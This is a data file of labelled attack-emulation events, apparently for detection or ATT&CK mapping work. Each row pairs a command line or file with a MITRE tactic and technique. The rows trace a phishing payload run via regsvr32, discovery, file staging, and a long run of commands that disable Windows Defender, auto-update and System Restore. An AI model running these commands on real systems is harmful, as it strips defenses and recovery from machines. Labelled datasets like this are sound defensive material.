b2d68fff-40e4-4bc8-8af3-3b96c54aa5e2,{'file': 'C:\\Users\\victim\\Downloads\\ENCOURAGING_MAESTRO.dll'},1,'Initial Access','T1566.002 Phishing: Spearphishing Link'
9063658f-b837-442f-acb7-5266c1293f73,{'subject': '"C:\\Windows\\system32\\regsvr32.exe" C:\\Users\\victim\\Downloads\\ENCOURAGING_MAESTRO.dll'},2,'Execution','T1204.002 User Execution: Malicious File'
969f2c16-a5d5-4210-93b4-e44b57715d39,{'subject': 'powershell.exe -Command get-smbshare'},3,'Discovery','T1135 Network Share Discovery'
f32f31e2-edc0-4104-a5f6-7d115bc8021f,{'subject': 'powershell.exe -Command get-smbshare'},4,'Discovery','T1135 Network Share Discovery'
b076b495-2562-4885-91bf-5126ef0e94e2,{'subject': 'powershell.exe -Command get-smbshare'},5,'Discovery','T1135 Network Share Discovery'
61c57d5a-c2ed-4f61-904b-e35184d0ee7b,{'subject': 'powershell.exe -Command Get-Process'},6,'Discovery','T1057 Process Discovery'
d524fb0b-143e-41c4-aa0d-0ec95942b032,{'subject': 'powershell.exe -Command Get-Process'},7,'Discovery','T1057 Process Discovery'
4f17acea-41e4-49e5-86b9-fd00d7e74651,{'subject': 'powershell.exe -Command Get-Process'},8,'Discovery','T1057 Process Discovery'
47d23f54-f75b-4d17-b415-d9ddb83e88a5,{'file': 'C:\\Users\\victim\\Downloads\\PLEASANT_THING.exe'},9,'Initial Access','T1566.002 Phishing: Spearphishing Link'
312922f5-cee9-4004-b3af-747358603585,{'subject': '"C:\\Users\\victim\\Downloads\\PLEASANT_THING.exe" '},10,'Execution','T1204.002 User Execution: Malicious File'
9f85e77a-9c9f-492d-be97-6d1bd917740a,{'file': 'PLEASANT_THING.exe'},11,'Initial Access','T1566.002 Phishing: Spearphishing Link'
ea3da547-f848-4598-bcd6-35408d851e3c,{'subject': 'powershell.exe -Command "Compress-Archive -Path \\"C://Users//victim//Downloads\\" -DestinationPath C://temp -Force"'},12,'Collection','T1074.001 Data Staged: Local Data Staging'
431e8330-cb88-4bb9-98de-7aaddaf43d71,{'subject': 'powershell.exe -Command "Compress-Archive -Path \\"C://Users//victim//Downloads\\" -DestinationPath C://temp -Force"'},13,'Collection','T1074.001 Data Staged: Local Data Staging'
d4a26628-b3a5-4990-a4ac-ed52492ac569,{'subject': 'powershell.exe -Command "Compress-Archive -Path \\"C:/User/victim/Downloads\\" -DestinationPath C:/temp/test -Force"'},14,'Collection','T1074.001 Data Staged: Local Data Staging'
e88bd758-c5b5-4c5e-8890-6ad44d8e6e8c,{'subject': 'powershell.exe -Command "$startingDirectory=\\"C:\\"; $outputZip=\\"C://temp\\"; $fileExtensions=@(\\".doc\\"'},15,'Collection','T1005 Data from Local System'
a475641a-3dac-4e1a-9bce-4b0493bfa2b3,{'subject': 'cmd.exe /c "reg add \\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f"'},16,'Defense Evasion','T1112 Modify Registry'
04e34b5b-06f3-4de2-a201-68ae00d8360d,{'subject': 'reg  add \\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f'},17,,'Defense Evasion','T1112 Modify Registry'
4c4985ad-ec11-4a56-b57a-45961f11dd78,{'subject': 'cmd.exe /c "reg add \\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\" /v \\"DisableSecuritySettings\\" /t REG_DWORD /d 1 /f"'},18,'Defense Evasion','T1112 Modify Registry'
ae4b73f7-3050-4c27-a603-cffbee46a7a0,{'subject': 'reg  add \\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\" /v \\"DisableSecuritySettings\\" /t REG_DWORD /d 1 /f'},19,'Defense Evasion','T1112 Modify Registry'
fba7fabb-7b66-41de-897d-ba98093b20f7,{'subject': 'cmd.exe /c "bcdedit /set safeboot network"'},20,'Defense Evasion','T1562.009 Impair Defenses: Safe Mode Boot'
048b9f3a-5520-42e9-bb8b-cfb3c3ff97de,{'subject': 'cmd.exe /c "reg add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\" /v HideSCANetwork /t REG_DWORD /d 1 /f"'},21,'Defense Evasion','T1112 Modify Registry'
b6502185-0144-46cd-993d-50ddb7b9bb93,{'subject': 'reg  add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\" /v HideSCANetwork /t REG_DWORD /d 1 /f'},22,'Defense Evasion','T1112 Modify Registry'
475641ab-f87f-4f37-8d9f-041a11c7d489,{'subject': 'cmd.exe /c "reg add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\\" /v \\"NoAutoUpdate\\" /t REG_DWORD /d 1 /f"'},23,'Defense Evasion','T1112 Modify Registry'
6c3990a0-7610-4291-acf0-8e6083533802,{'subject': 'reg  add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\\" /v \\"NoAutoUpdate\\" /t REG_DWORD /d 1 /f'},24,'Defense Evasion','T1112 Modify Registry'
29d403f8-d2a0-4dd4-9dca-0c5ffc2fe5f0,{'subject': 'cmd.exe /c "\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\" -RemoveDefinitions -All"'},25,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
a0a47fc6-c26e-4a07-bc73-fe08cf0507d3,{'subject': 'cmd.exe /c "schtasks.exe /Change /TN \\"\\Microsoft\\Windows\\SystemRestore\\SR\\" /disable"'},26,'Impact','T1490 Inhibit System Recovery'
3e06219f-7075-4e08-b18d-7d7e983f260d,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiSpyware\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},27,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
ea6c031b-a921-429b-bea4-37f6977a4da0,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiVirus\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},28,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
addf8b3a-db1e-42c4-943d-abe03c0e4858,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableBehaviorMonitoring\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},29,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
06f7a4c2-b5ef-4c86-9511-fa093d9e73eb,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIntrusionPreventionSystem\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},30,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
7718dbc4-6342-48da-987b-d5ec01b2388e,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIOAVProtection\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},31,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
fe166208-4b92-4ea2-974d-b9bddcf75792,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableOnAccessProtection\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},32,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
1c3a3c12-7844-4b92-899d-f41b9943caf4,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRealtimeMonitoring\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},33,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
b034f7d8-9aa3-4221-ac9c-439d6cea413b,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRoutinelyTakingAction\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},34,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
